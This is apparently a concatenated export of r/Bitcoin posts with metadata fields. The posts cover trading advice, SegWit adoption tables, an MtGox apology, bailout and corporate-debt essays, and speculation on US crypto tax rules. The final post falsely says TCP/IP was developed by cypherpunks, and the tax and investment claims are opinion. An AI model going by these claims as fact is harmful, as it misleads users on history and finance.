So, is he an idiot? Absolutely! It is only a question of time before he ruins his own and his family's life with some incredibly reckless financial decision.7. **Try to understand the motives governing your decisions and act (or don't act) accordingly**. If your actions are about to be driven by extreme emotions such as fear, panic or excitement ‚Äì stop immediately and reevaluate the situation. Otherwise you'll end up belonging to the FOMO buyer/panic seller club aka the money losers. If you want to stay on the earning side long term, you must keep your head cool and think clearly.8. **Day trading is probably not for you**. Consider this: evidence in neuroscience research shows that we are a loss-averse species. For this we should thank our stone age ancestors who had barely enough food, shelter and belongings to survive in a very adverse world. Losing even a little of what they had meant their existence was in jeopardy. This explains why contemporary humans prefer avoiding financial loss to making financial gain. Neuroscientists claim that losing money activates the same area of the brain that responds to mortal danger. This is why in order to do day trading you must have A LOT of self-control and balls of steel ‚Äì there are many ups and downs during a single day. It drains you emotionally, you end up being addicted to adrenaline, your fianc√©e hates it, and the hodlers will probably outperform you in the long run anyway.9. **Volatility is your friend**. Over time BTC volatility makes the coin stronger, not weaker. While wild swings in price makes BTC almost impossible to use as a currency, volatility is good from the financial asset point of view. Traders and investors dealing with BTC get used to huge and sudden price hikes and dips. Unlike for any 'stable' stock of any prominent multinational corporation, even substantial and unexpected shocks will not undermine the confidence in BTC. BTW, best of luck to everyone planning to short BTC. :)10. **Make small mistakes, learn from them, get wiser, err less**. In your childhood days, you needed the experience of burning your hand with fire so that for the rest of your life you wouldn't need to think about the painful experience. That information is now hardwired in your brain and helps you to avoid getting harmed. If you've just started trading crypto, expect to make mistakes and prepare to learn from them. It's only after you get into FOMO, get panicked big time, take too big a risk, get out too early only to jump in at the worst possible time, ONLY and ONLY then you'll start to improve. **The Road to Wisdom**The road to wisdom? ‚ÄîWell, it's plain and simple to express: Err and err and err again, but less and less and less. ‚Äî Piet HeinHope that was helpful.",False,10 things I wish someone had told me when I was learning to trade crypto,u/[deleted],2,5147,0.91,https://www.reddit.com/r/Bitcoin/comments/7iug4i/10_things_i_wish_someone_had_told_me_when_i_was/,[]

However, this is quite important as I see much misinformation on which exchanges use segwit or not.    Please upvote for awareness.**BACKGROUND**Subhan Nadeem has pointed out that:[If every transaction in the Bitcoin network was a SegWit transaction today, blocks would contain up to 8,000 transactions, and the 138,000 unconfirmed transaction backlog would disappear instantly. Transaction fees would be almost non-existent once again](https://hackernoon.com/bitcoin-owners-you-need-to-do-these-two-things-right-now-a73122dd23d4). A few thousand bitcoin users from /r/Bitcoin switching to making their next transactions SegWit transactions will help take pressure off the network now, and together we can encourage exchanges/wallets to rapidly deploy SegWit for everyone ASAP. Let's make it happen. You can help by taking one or more of the action steps below. ___________________**ACTION STEPS**1. If your favorite wallet has not yet implemented SegWit, kindly ask them to do so immediately. In the meantime start using a wallet that has already implemented SegWit. 2. If your favorite exchange has not yet implemented SegWit, try to avoid making any further purchases of bitcoin at that exchange and politely inform them that if they do not enable SegWit within 30-days they will lose your business. Sign-up for an account at a SegWit deployed exchange now and initiate the verification process so you'll be ready to bail3. Help educate newcomers to bitcoin about the transaction issue, steer them towards SegWit wallets from day one, and encourage them to avoid ever  purchasing bitcoin through non-SegWit ready exchanges that are harming bitcoin**IMPORTANT NOTE**: The mempool is currently overflowing. If you are a long-term holder and really have no reason to move your bitcoins at this time, wait until the mempool starts to clear and transaction fees go down before moving your bitcoins to a SegWit address or SegWit friendly exchange__________________________**SELECTED TOP EXCHANGES BY SEGWIT & BATCHING STATUS** There are 2 different Segwit address formats.  * p2sh - starting with a '3...'* bech32 - starting 'bc1...'Not many wallets/exchanges support bech32 yet and will claim the address is invalid if you try to send to it. bech32 ('native Segwit') is a mildly better solution compared to p2sh.| **Exchange**  | **Batching Status** | **Segwit (p2sh)** | **Send to bech32** ||---------------|---------------------|-------------------|---------------------|| Binance       | **Yes**             | No                | No                  || Bitfinex      | **Yes**             | No                | No                  || Bitonic       | ?                   | No                | No                  || Bitstamp      | **Yes**             | **Yes**           | No                   || Bittrex       | **Yes**             | ?                 | ?                   || Coinbase/GDAX | No                  | No                | No                  || Gemini        | No                  | No                | No                  || HitBTC        | **Yes**             | **Yes**           | ?                   || Huboi         | ?                   | ?                 | ?                   || Kraken        | No                  | **Yes**           | ?                   || LocalBitcoins | No                  | ?                 | ?                   || OKEx          | ?                   | ?                 | ?                   || Poloniex      | ?                   | **Yes**           | ?                   || QuadrigaCX    | **Yes**             | **Yes**           | ?                   || Shapeshift    | **Yes**             | No                | No                  |[Source 1](https://bitcoincore.org/en/segwit_adoption/)[Source 2](https://www.reddit.com/r/Bitcoin/comments/7kherf/what_exchanges_batch_there_withdrawal_txs_to_save/)___________________**WALLETS** Make sure you have a SegWit capable wallet installed and ready to use for your next bitcoin transaction| SegWit Enabled Wallets | Wallet Type ||------------------------|-------------|| Ledger Nano S          | Hardware    || Trezor                 | Hardware    || Electrum               | Desktop     || Armory                 | Desktop     || Edge                   | iOS         || GreenAddress           | iOS         || BitWallet              | iOS         || Samourai               | Android     || GreenBits              | Android     || Electrum               | Android     |______________________**TODAY's NEWS/DEVELOPMENTS/VICTORIES**- [Core is considering prioritizing SegWit GUI in the Core Wallet and pushing out an update fast without waiting for other features](https://www.reddit.com/r/Bitcoin/comments/7lc1n9/latest_bitcoin_core_irc_meeting_segwit_wallet_is/)- [An Exodus Wallet representative has said they will not enable SegWit for now](https://www.reddit.com/r/Bitcoin/comments/7lcm1t/exodus_response_as_to_why_they_havent_adopted/)- [Largest exchange in Brazil implemented withdraws using Segwit](https://www.reddit.com/r/Bitcoin/comments/7lgxnc/largest_exchange_in_brazil_implemented_withdraws/)______________________**MEMPOOL/SEGWIT STATISTICS**- [BitInfoCharts.com - Average Transaction Fees](https://bitinfocharts.com/comparison/bitcoin-transactionfees.html#3m) - $42USD per Tx- [Blockchain.info - Unconfirmed Transactions](https://blockchain.info/unconfirmed-transactions) - 174K Unconfirmed Tx's- [SegWit Charts](http://segwit.party/charts/) - 13% SegWit Tx's______________________**FAQs**If I'm a HODLer, will it help to send my BTC to a SegWit address now?- No, just get ready now so that your NEXT transaction will be to a SegWit wallet. Avoid burdening the network with any unneccessary transactions for now. Can you please tell me how to move my bitcoins to SegWit address in Bitcoin core wallet? Does the sender or receiver matter? - The Bitcoin core wallet does not yet have a GUI for its SegWit functionality. Download Electrum v3.0.3 to generate a SegWit address. A transaction between two SegWit addresses is a SegWit transaction.  A transaction sent from a SegWit address to a non-SegWit address is a SegWit transaction. A transaction sent from a non-SegWit address to a SegWit address is NOT a SegWit transaction. You can send a SegWit Transaction if the sending address is a SegWit address.

Since taking over the most active Bitcoin exchange in 2011, I ran MtGox until filing for civil rehabilitation on February 28th 2014 (which became bankruptcy less than 2 months later) because a large amount of Bitcoins went missing. Since then, four years have passed, and MtGox is still in bankruptcy today. I've been arrested, released under bail after a little less than one year, and am now trying to assist MtGox getting into civil rehabilitation.I did my best trying to grow the ecosystem by running the biggest exchange at the time. It had big problems but still managed to hang in there. For a while. A quite long while, even, while the rest of the ecosystem caught up. At the end of the day, the methods I chose to try to get MtGox out of its trouble ended up being insufficient, insufficiently executed, or plain wrong.I know I didn't handle the last, stressful days of the outdrawn and painful Gox collapse very well. I can only be humble about that in hindsight. Once again, I'm sorry.Japanese bankruptcy law has a particularly nasty outcome here, and I want to address this up front. As creditors claims were registered, those claims were registered in the valuation of Japanese Yen on the bankruptcy date. That's the only way Japanese bankruptcy law can work (most bankruptcy laws around the world operate this way for that matter). This means that the claims can be paid back in full, and there will still be over 160,000 bitcoin and bitcoin cash in assets in the Gox estate. The way bankruptcy law works is that if there are any assets remaining after the creditors have been paid in full, then those assets are distributed to shareholders as part of the liquidation.That's the only way any bankruptcy law can reasonably work. And yet, in this case, it produces an egregiously distasteful outcome in that the shareholders of MtGox would walk away with the value of over 160,000 bitcoin as a result of what happened.I don't want this. I don't want this billion dollars. From day one I never expected to receive anything from this bankruptcy. The fact that today this is a possibility is an aberration and I believe it is my responsibility to make sure it doesn't happen. One of the ways to do this would be civil rehabilitation, and as it seems most creditors agree with this, I am doing my best to help make it happen. I do not want to become instantly rich. I do not ask for forgiveness. I just want to see this end as soon as possible with everyone receiving their share of what they had on MtGox so everyone, myself included, can get some closure.I'm an engineer at heart. I want to build things. I like seeing what I build being useful, and people being happy using what I build. My drive, from day one, has been to push the limits of what is technically possible, and this is the main reason I liked and have been involved with Bitcoin in the first place. When I took over MtGox, I never imagined things would end this way and I am forever sorry for everything that's taken place and all the effect it had on everyone involved.Hopefully, I can make what I've learned in this experience useful to the community as a whole, so there can at least be something positive in the end.Ask me anything you like.**EDIT**: With this coming to r/all there have been an overwhelming number of messages, questions etc. I will continue responding for a little while but probably won't be able to respond to new questions (it is starting to be late here and I've been spending the last few hours typing).

You default to erroneously blaming the Chinese but that doesn't quite add up so you take to twitter with panicked breath searching for anyone, anything that might have the answer as to what the F is happening.

Your devastated, but manage to breathe a small sigh of relief. Well at least i can't lose anymore you say, at least i walked away with something.  Your emotionally and physically exhausted now but you manage to drag yourself across the room, you fall flat on your bed with one final thought passing through your mind before you let the darkness overtake you...'why didn't i just sell the top?'In the morning you wake to the realization that you slept fully clothed and at an odd enough angle that your neck is surely going to feel exactly as bad if not worse for the rest of the day.  The events of the previous night come back to you in a flurry of blurred emotions and while you almost can't bring yourself to check the price you just have to know.  How much lower did it go? After all, there is still a glimmer of a hope, you think well, perhaps it isn't all bad, perhaps I can buy back in a bit lower and make the losses back in the long term.  You begrudgingly open a chart and whatever small amount of hope that remained escapes your lungs before the sigh hits your lips.

That has forced the real economy into a sharp recession and triggered a rolling financial crisis. Below is a primer on one key piece of this mess: the crisis in corporate debt markets. This branch of finance is vitally important because even healthy companies often need access to credit. If they do not get it, they go under.In 2008, the vector of crisis ran from mortgage-backed securities to the rest of the financial sector and then to the real economy. This time, the real economy is being hit directly, and the damage is reverberating back into financial markets.  The failing markets, in feedback-loop fashion, further threaten the real economy as corporations find it harder to borrow. As the corporate debt markets sour, major companies will go bankrupt. Unemployment is skyrocketing. Some analysts expect the economy to contract by an annualized rate of 30 percent during the second quarter of 2020.Already, US financial markets are on public life support. The Federal Reserve has committed to unlimited purchases of all sorts of assets: US Treasuries, mortgage-backed securities, car loans, municipal debts, and, in a historic step, both short term and long-term corporate debt. But the crisis will require more than a financial rescue.The key political question now is: What sort of controls will come with the state intervention? Corporate greed and self-dealing need to be checked not merely in the name of fairness but also to make sure public bailout money is actually invested in the real economy rather than just gambled away, as it was after the 2008 crash and rescue.###The Rise of Corporate DebtSince 2008, household debt levels have actually declined and are now lower than they were going into the last crash. But not corporate debt. Measured as a firm's net debt compared to its EBITDA (earnings before interest, tax, depreciation, and amortization), corporate debt has doubled since the last crash. In 2009, the average American company owed $2 of debt for every $1 in earnings. Today, the average firm carries net debt to EBITDA of 3 to 1, and many firms ‚Äî like Ford Motor, CarMax, Harley-Davidson, and General Motors ‚Äî carry ratios ranging from 8 to 1, to as high as 15 to 1. Boeing, a special case because of its 737 MAX crisis, carries a ratio of 37 to 1.Over the last two decades, corporate America's credit rating has collapsed. In the early '90s, more than sixty companies held AAA credit ratings. Today, only two US firms are AAA rated: Johnson & Johnson and Microsoft. In 2001, fewer than one in five investment-grade firms were rated BBB. Today half of all investment-grade corporate debt belongs to firms rated triple-B (BBB) or lower. A third of those firms are rated triple-B minus (BBB-), one notch away from speculative or junk status.Already many triple-B-rated corporate bonds are trading on secondary markets at unusually low prices and high yields, often above 5 percent; that means even investment grade bonds are being treated as junk. Soon many triple-B-rated corporations will be formally downgraded to junk. That will drive up their borrowing costs and restrict their access to credit. Even healthy companies often need access to ready credit. If they do not get it, they go under.The rating agency Moody's estimates the default rate for speculative-grade debt ‚Äî companies with ratings lower than Baa from Moody's Investors Service, or a rating lower than BBB from Standard & Poor's ‚Äî might reach 10 percent this year, up from 2.3 percent last year. The consequences of all this will reverberate throughout the wider economy, deepening and extending the recession.Total global corporate debt, including bonds and loans, is approximately $66 trillion; more than double what it was a decade ago. For comparison, the combined gross national product of all economies was estimated at $80.27 trillion in 2017. About a quarter of that is the US economy.###What They Did With the MoneyAfter the 2008 crash, the world's central banks, with the US Federal Reserve in the lead, spent the next decade pushing money into the financial markets by way of super-low interest rates and the direct public purchase of financial assets from the private sector via quantitative easing (QE).The cheap credit encouraged lots of corporate borrowing in the form of loans from banks and massive issuance of corporate bonds. Unlike loans, which can be routinely extended, or sometimes abruptly terminated, or have interest rates that float up and down, corporate bonds are debt instruments issued by a company committing to repay borrowed money on a specified schedule at a specified, usually fixed, rate of interest.Corporations have been borrowing for a variety of reasons that range from shrewd arbitrage to stupid and reckless asset stripping. For a struggling and unprofitable company, for example JCPenney, debt can be a lifeline. For a profitable firm, borrowing money can be a way to raise capital without diluting existing shareholders' claim on the company's profits, which would happen if the firm issued stock.Even some profitable firms with piles of cash borrowed rather than spend their cash, in part for the firepower effect: letting other competitors and market entrants know that the firm has enough money on hand to buy out any threatening start-ups, and showing the world the firm is ready to ride out any economic crisis.Some firms used their borrowed money to buy other firms. This helped fuel a post-2008 wave of mergers and acquisitions (M&As). Deloitte reported more than $10 trillion in [M&A] domestic transactions since 2013. Targeted companies borrowed to stockpile cash as a defense against such takeovers.Firms also borrowed to fund CEO compensation, distributions to investors via dividends, and stock buybacks. Companies buy back their own stock so as to boost its price. A rising stock price is useful in many ways: it can keep away hostile raiders by making a targeted company too expensive to take over, but it can also draw in friendly suitors because (with some creative accounting) a rising stock value can make a weak firm appear more profitable. Corporate executives like a rising stock price because compensation packages are both tied to stock performance and almost always include some payment in company stock, so the higher the stock price, the higher the executives' payout.Sometimes, firms even invested their borrowed money in actual production. The capital-intensive oil and gas industry did that, but as we explain below, it still faces a crisis, perhaps more salient than other sectors.###Bad Credit as Perverse IncentiveThe end result of all the borrowing was declining corporate credit-worthiness: corporate debt soon badly outpaced their earnings growth and cash balances. This led to widespread credit-rating downgrades.Perversely, lower credit ratings did not slow the borrowing binge, but rather spurred on further lending and borrowing, because as corporate credit ratings slipped, the interest rate that the downgraded firms had to pay on their loans and bonds increased. And, thus, so too did the lenders' profits.Corporate debt and stock prices entered into a twisted dialectic, each driving the other. As the stock market continued to inflate over the last decade, it provided the confidence investors required to continue their purchases of risky corporate bonds.Keep in mind that many of the lending banks and asset funds were actually or essentially borrowing from Uncle Sam at inflation-adjusted rates close to zero, then lending to companies with triple-B and triple-B minus ratings at 5 percent interest. Profits like that meant there were always banks and asset funds eager to lend to debt-burdened corporations.Investors could directly purchase specific corporations' bonds, or, as is more often the case, invest in mutual funds or exchange-traded funds (ETFs) that target an array of corporate bonds. High-risk loans were also sliced and diced and repackaged into bundles called collateralized loan obligations (CLOs), a class of securities backed by an underlying portfolio of corporate loans.According to the Federal Reserve Board of Governors, the majority of American CLOs are held by US institutional investors, including insurance companies, mutual funds, and depository institutions. This means that when the debt is unable to be serviced, the pain will be absorbed within the US economy, much of it by the unassuming customers of these financial behemoths.As was the case with the mortgage-backed securities of the 2008 crash, these funds helped distribute risk and thus gave an appearance of safety. The logic was that owning 1 percent of a hundred different loans would be safer, even if some loans went bad, than owning the entirety of a single debt security. The logic is not entirely wrong. And that is part of the problem: it encouraged yet more lending. As long as the economic forecast was optimistic, there was no reason for the debt spree to let up.###Zombies and OthersCorporate debt, like much of the economy, is a story of disparities. Not every corporation is burdened by debt. Some firms are actually awash in cash. Microsoft, Berkshire Hathaway, Alphabet Inc, and Apple each sit on more than $100 billion in cash. As a whole, corporate America has been sitting on record amounts of cash in recent years. But at the same time, Morgan Stanley Investment Management estimates that one in six US companies cannot cover even the interest payments on their debts.At the heart of the problem are leveraged loans and so-called zombie firms. Leveraged loans are a type of expensive, high-risk credit extended to already heavily indebted companies. Since the 2008 crash, the leveraged loan market has doubled to $1.2 trillion. Now, leveraged loans in the United States are being re-sold at only 84 cents on the dollar, their lowest price since August 2009. The majority of leveraged loans ‚Äî more than half ‚Äî are in the form of the aforementioned CLOs. In the fourth quarter of 2018, there were $617 billion of CLOs outstanding.Zombie firms are defined by the Bank for International Settlements as heavily indebted, well-established companies that have failed to be profitable over an extended period and have low expected profitability in the future. In other words, heavily indebted start-ups do not qualify as zombies. The most threatened sectors are energy, automotive, insurance, capital goods (meaning equipment and machinery), telecoms, aerospace and defense, and some parts of retail.The bull market of rising, often overvalued, stock prices allowed many uncompetitive and unprofitable companies to appear healthy based solely on their stock's performance. Even before the markets started to crash on March 9, some analysts were prescient enough to call the market's bluff at the beginning of the year.But in this rapidly developing crisis, firms all across the economy may soon find it impossible to meet their liabilities. With the coronavirus breaking supply chains and forcing massive constrictions in consumer demand, corporate earnings are contracting fast, which in turn will badly hurt corporate debt servicing.Like a hypertrophied organ rupturing, the putrefaction of unsustainable corporate debt now threatens to create a generalized economic sepsis that will hurt even healthy firms.###Profiles in DebtAirlines. The top six major US airlines spent enormous sums to buy back their stock over the last decade. US airlines (as a whole) spent 96 percent of their borrowed money on buying back stock. Now, revenue from flights is plummeting. United Airlines' bookings have fallen by 70 percent. Back in 2011, American Airlines filed for Chapter 11 bankruptcy with $29 billion in liabilities; today, they have over $34 billion in debt. Yields on some of their bonds reached a whopping 12 percent, a particularly distressing sign as interest rates have been slashed by the Fed in an effort to relieve credit markets.Energy. Even before the effects of coronavirus eviscerated demand for fossil fuels, US energy companies were suffering due to high fixed costs and low energy prices. In the last five years, 208 US energy companies have declared bankruptcy. Energy prices have been pushed down by the fracking revolution, the rise of renewable energy, and oil overproduction due to struggles between large producers like Saudi Arabia, Russia, and the United States.Now the coronavirus shock is pushing firms over the edge. Occidental Petroleum ‚Äî which has $40 billion in debt, while its market value (the value of all of its stocks combined) is less than $11 billion ‚Äî recently had its debt downgraded to junk.Energy mutual funds reveal the crisis in the energy sector as a whole. Vanguard Energy Fund, considered one of the top four oil mutual funds, has lost over 41 percent of its value since the beginning of the year. Of course, the biggest oil companies, the Oil Majors (such as BP, Exxon Mobil, and Royal Dutch Shell) have enough resources, market power, and government support to survive the crisis. But the effects on the less established firms stretch beyond the energy industry itself.Lenders. As the oil and gas firms go into crisis, the banks that extended them credit may also face defaults. Loans outstanding to the petroleum sector from regional banks in North America exceed $100 billion. Banks financing oil companies in Texas and Oklahoma saw their share prices drop nearly 30 percent. In oil-dependent states, public budgets will hurt as tax revenues decline sharply.Retail. A number of important retailers carry net debt to EBITDA ratios that are too high to be sustainable under current conditions. For example, Rite Aid owes $15.80 for every dollar it earns. For JCPenney, the ratio is $8.30 to $1; for Walgreens Boots Alliance, it is $5.80 to $1. Office Depot owes $4.60 compared to every dollar earned.###Beyond BailoutBailing out distressed companies, even taking them under public ownership for a while, may staunch the bleeding. And the bubble can eventually be reinflated with enough effort. But a replay of the 2008 bailout, which involved lots of public money but very little public regulation and planning, will only mean a long slump followed by a bubble for the rich.The American economy is a sick beast. It needs not only government handouts and ownership ‚Äî which it is getting ‚Äî it also needs planning.Oil, airlines, and cruise ships ‚Äî these are high-emission industries that, in the face of climate crisis, must be radically transformed or cease to exist. With government ownership and planning, these industries could be unwound and their resources redeployed.Although COVID-19 set off our current recession, it was the indulgence of the 1 percent built into the 2008 rescue that is responsible for the depth and severity of our current economic crisis. Without guidance, money was poured into the financial system. Not surprisingly, it blossomed alongside the mutually reinforcing dynamic of artificially inflated stock prices and ballooning corporate debt.Capitulation to the gluttony of financiers is deeply unjust. But it is also unworkable in purely technical terms. Without constraints on greed, there will be another bubble and crash and a longer slump, more suffering, greater inequality, and more social instability. We have to force government to use its legal and financial power to steer the American economy toward more egalitarian, socially rational, and environmentally sustainable purposes. We have to make this bailout work for the majority of us.#Corporate Socialism: The Government is Bailing Out Investors & Managers Not YouThe U.S. government is enacting measures to save the airlines, Boeing, and similarly affected corporations. While we clearly insist that these companies must be saved, there may be ethical, economic, and structural problems associated with the details of the execution. As a matter of fact, if you study the history of bailouts, there will be.The bailouts of 2008‚Äì9 saved the banks (but mostly the bankers), thanks to the execution by then-treasury secretary Timothy Geithner who fought for bank executives against both Congress and some other members of the Obama administration. Bankers who lost more money than ever earned in the history of banking, received the largest bonus pool in the history of banking less than two years later, in 2010. And, suspiciously, only a few years later, Geithner received a highly paid position in the finance industry.That was a blatant case of corporate socialism and a reward to an industry whose managers are stopped out by the taxpayer. The asymmetry (moral hazard) and what we call optionality for the bankers can be expressed as follows: heads and the bankers win, tails and the taxpayer loses. Furthermore, this does not count the policy of quantitative easing that went to inflate asset values and increased inequality by benefiting the super rich. Remember that bailouts come with printed money, which effectively deflate the wages of the middle class in relation to asset values such as ultra-luxury apartments in New York City.The Generalized Bob Rubin Trade: Keep the profits, transfer losses to taxpayers. Named after Bob Rubin who pocketed 120 million dollars from Citi but claimed uncertainty and kept past bonuses. This encourages anyone to never be insured for such eventualities since the government will pick up the tab.####If It's Bailed Out, It's a UtilityFirst, we must not conflate airlines as a physical company with the financial structure involved. Nor should we conflate the fate of the employees of the airlines with the unemployment of our fellow citizens, which can be directly compensated rather than indirectly via leftovers of corporate subsidies. We should learn from the Geithner episode that bailing out individuals based on their needs is not the same as bailing out corporations based on our need for them.Saving an airline, therefore, should not equate to subsidizing their shareholders and highly compensated managers and promote additional moral hazard in society. For the very fact that we are saving airlines indicates their role as utility. And if as such they are necessary for society, then why do their managers have optionality? Are civil servants on a bonus scheme? The same argument must also be made, by extension, against indirectly bailing out the pools of capital, like hedge funds and endless investment strategies, that are so exposed to these assets; they have no honest risk mitigation strategy, other than a trained na√Øve reliance on bailouts or what's called in the industry the government put.Second, these corporations are lobbying for bailouts, which they will eventually get thanks to the pressure they can exert on the government via lobby units. But how about the small corner restaurant ? The independent tour guide ? The personal trainer? The massage professional? The barber? The hotdog vendor living from tourists near the Met Museum ? These groups cannot afford lobbyists and will be ignored.####Buffers Not DebtThird, as we have been warning since 2006, companies need buffers to face uncertainty ‚Äìnot debt (an inverse buffer), but buffers. Mother nature gave us two kidneys when we only need about a portion of a single one. Why? Because of contingency. We do not need to predict specific adverse events to know that a buffer is a must. Which brings us to the buyback problem. Why should we spend taxpayer money to bailout companies who spent their cash (and often even borrowed to generate that cash) to buy their own stock (so the CEO gets optionality), instead of building a rainy day buffer? Such bailouts punish those who acted conservatively and harms them in the long run, favoring the fool and the rent-seeker.####Not a Black SwanFurthermore, some people claim that the pandemic is a Black Swan, hence something unexpected so not planning for it is excusable. The book they commonly cite is The Black Swan. Had they read that book, they would have known that such a global pandemic is explicitly presented there as a white swan: something that would eventually take place with great certainty. Such acute pandemic is unavoidable, the result of the structure of the modern world; and its economic consequences would be compounded because of the increased connectivity and overoptimization. As a matter of fact, the government of Singapore, whom we advised in the past, was prepared for such an eventuality with a precise plan since as early as 2010.#...........................................................................^^>Section ^^4009. ^^Temporary ^^Government ^^in ^^the ^^Sunshine ^^Act ^^Relief.^^Temporarily ^^permits ^^the ^^Board ^^of ^^Governors ^^of ^^the ^^Federal ^^Reserve ^^Federal ^^Reserve ^^to ^^conduct^^meetings ^^without ^^regards ^^to ^^the ^^Government ^^in ^^the ^^Sunshine ^^Act, ^^which ^^institutes ^^certain^^requirements ^^for ^^meetings ^^that ^^may ^^be ^^impracticable ^^to ^^carry ^^out ^^under ^^certain ^^unusual ^^and^^exigent ^^circumstances, ^^such ^^as ^^those ^^related ^^to ^^the ^^coronavirus ^^outbreak, ^^if ^^the ^^Chairman^^determines, ^^in ^^writing, ^^that ^^such ^^circumstances ^^exist. ^^The ^^Federal ^^Reserve ^^is ^^still ^^required ^^to ^^keep^^a ^^record ^^of ^^all ^^votes ^^and ^^the ^^reason ^^for ^^votes ^^during ^^this ^^time. ^^This ^^authority ^^expires ^^at ^^the ^^earlier^^of ^^December ^^31, ^^2020, ^^or ^^the ^^date ^^on ^^which ^^the ^^national ^^emergency ^^declaration ^^related ^^to^^coronavirus ^^is ^^terminated. ^^https://www.banking.senate.gov/imo/media/doc/Title%20IV_Section%20by%20Section.pdf^[This.is.your.brain.on.central.banking,regulatory.capture,and.financialization.](https://medium.com/@allenfarrington/this-is-not-capitalism-5ed0a9d5dfa9)#...........................................................................2020 [Dow Futures Reverse Gains Despite Trump's $6 Trillion Fiscal BombDow futures spiked after Trump's top economic advisor Larry Kudlow unveiled a gigantic $6 trillion stimulus package for the U.S. But the gains didn't last amid underlying concerns about the health of the economy.](https://www.ccn.com/dow-futures-reverse-gains-despite-trumps-6-trillion-fiscal-bomb/)",False,"The Covid corporate bonus bailout costs about $18,000 per citizen.

There are, however, nuances in the internal revenue code that make this news much bigger than most realize.Most know that when trading foreign currencies gains must be reported and are taxed.  But Section 988(e) carves out a *de minimis* exception for personal transactions where the gains do not exceed $200.This is intended to allow travelers to transact in foreign currencies without all of the burdensome reporting requirements.So far, Bitcoin has not qualified for this exception.  Under IRS Notice 2014-21, the IRS opines that Bitcoin is property and not a currency because **it does not have legal tender status in any jurisdiction**.  There is a good argument, though, that once Bitcoin is legal tender in El Salvador, it will qualify for US individuals as a nonfunctional currency (under Section 988), allowing individuals to forgo reporting gains on small, daily transactions‚Äîpersonal transactions.In other words (**tldr**), if Bitcoin is legal tender in El Salvador, US citizens could possibly freely transact in Bitcoin, as a nonfunctional currency, without a need to report gains of less than $200.That's potentially huge news for retail US citizens, but **there is also huge news for US Bitcoin businesses.**Most US businesses use the US dollar as their unit of account for bookkeeping and reporting.  However, there are cases where businesses operating primarily in foreign jurisdictions use a foreign currency‚Äîthe unit of account does not have to be USD.  The unit of account used by the business is the **functional currency** of the business and, perhaps, even an individual (see Sec. 985 IRC).  If a business's functional currency is a foreign currency, it does not have to bother with gains/losses related to USD fluctuations.Again, under Notice 2014-21, Bitcoin cannot qualify as a functional currency.  And, again, this could change if El Salvador adopts Bitcoin as legal tender.**Final tldr** If Bitcoin becomes legal tender in El Salvador, IRS Notice 2014-21 may become partially null, relieving US individuals and business of huge tax and reporting burdens, paving the way for Bitcoin to legally and easily be used as a currency in the US.*Disclaimer: I am not a tax lawyer.  The discussion and analysis on this should be much more detailed before financial decisions are made.  I've written this to be used as a starting point for discussion with a tax lawyer.***Edit**: Many have pointed out that Japan recognized Bitcoin as legal tender in 2017.  They did not.  A lot of misinformed authors incorrectly wrote that, but there is a distinction between Japan's legal recognition of Bitcoin as a form of payment and what the Code/Regs/precedent considers legal tender.  I think (and hope) that El Salvador will truly recognize Bitcoin as legal tender.**Edit 2**:  A Decrypt article mentioning this thread and citing former IRS counsel to point out additional nuances.  https://decrypt.co/73101/el-salvador-legal-tender-move-unlikely-to-change-us-tax-on-bitcoin-former-irs-counsel.  FWIW, I agree with most of what's written.  Particularly, (1) if Bitcoin is currency, all gains over $200 would be treated as ordinary income rather than capital gains and (2) the IRS will likely need to be challenged before their is clarity on whether Bitcoin will qualify as a currency rather than property.  I disagree that it will require more and more countries to recognize it as legal tender‚Äîone should be fine, but it is true that there will likely need to be evidence that Bitcoin is actually commonly used for personal transactions (not just a pretextual legal tender).  With the lightning network quickly gaining momentum, I expect El Salvador's move to be the catalyst that starts to convert Bitcoin's usage from just a store of value to also a common medium of exchange (i.e., a currency).",False,There are potentially huge US tax and reporting implications if El Salvador makes Bitcoin legal tender,u/[deleted],53,4652,0.95,https://www.reddit.com/r/Bitcoin/comments/ntmzwu/there_are_potentially_huge_us_tax_and_reporting/,[]

Wondering why they are so against it? The reason seems more obvious than ever.Pandora papers showed that people are using loopholes in tax laws to hide their wealth in tax havens to hide their wealth or ill gotten gains. They are not using cryptocurrency to do that, there are plenty of loopholes in tax laws for doing it legally.The rich are holding properties and investments under a network of offshore companies that are set up in other countries, or 'offshore'.These offshore countries or territories are where:'- it's easy to set up companies'- there are laws that make it difficult to identify owners of companies'- there is low or no corporation tax.The best part of it is that using tax havens to dodge taxes is not illegal. Loopholes in the law allow people to legally avoid paying some taxes by  moving their money or setting up companies in tax havens, but it is  often seen as unethical.Its estimated that from $5.6 trillion to $32 trillion is hidden in tax havens, according to the ICIJ.  The IMF has said the use of tax havens costs governments worldwide up to $600bn in lost taxes each year.To hide money all you need to do set up a shell company in one of the countries or  jurisdictions with high levels of secrecy. This is a company that exists  in name only, with no staff or office.  It costs money though. Specialist firms are paid to set up and run shell  companies on your behalf. These firms can provide an address and names  of paid directors, therefore leaving no trail of who is ultimately  behind the business.When such a huge amount of money is hidden in offshore havens, the rich still blames cryptocurrency as the culprit for money laundering. This is classic gaslighting. They are projecting and blaming the most vulnerable group, what they do themselves.This legal way of tax dodging will never end because the people that could end the secrecy offshore are themselves benefiting from it. So there's no incentive for them to end it.Its time more people speak up against this and move more towards cryptocurrency where all data is independently verifiable.",False,"In the over 12,9 Million Documents and Terabytes of Data detailing how Billionaires and Politicians have avoided Taxes, Bitcoin is not used a Single Time.",u/[deleted],29,4599,0.94,https://www.reddit.com/r/Bitcoin/comments/q1zcf0/in_the_over_129_million_documents_and_terabytes/,[]

It was released in 2009****TCP/IP are just protocols that were released in 1972. You could call them the backbone of the internet. Look at how long it took us to get to the internet that we have today, where TCP/IP is the backbone.**[**Click here to read a bit about TCP/IP and blockchain technology.**](https://hbr.org/2017/01/the-truth-about-blockchain)HTTP is just a protocol that was released in 1991. You could call it the backbone of the world wide web.SMTP is just a protocol that was released in 1982. And IMAP is just a protocol that was released in 1986. You could call these protocols the backbone of email. Many people used to say that email was useless and nobody would ever use it.TCP/IP was actually developed by cypherpunks just like bitcoin, PGP, and many other great protocols and technologies. In fact, two cypherpunks by the names of Hal and Len actually lived near each other and both helped develop TCP/IP. And they are also two of the three most likely candidates for being Satoshi. But that's not important.People used to say computers and the internet was a useless waste too. Computers do use far more electricity than bitcoin mining. So perhaps they were right after all.We are in the early majority. Bitcoin hasn't had it's Windows 95 moment yet, and I'll explain that statement below.**Do you remember back in 1990 when everyone had heard of the internet but you didn't know anyone who used it? This is much like bitcoin right now, and even less people use the lightning network. Both are still in beta. February 1991 is when AOL for DOS was released. AOL for DOS made the internet fairly easy for everyone to use. But you still probably didn't know anyone who used it, and you 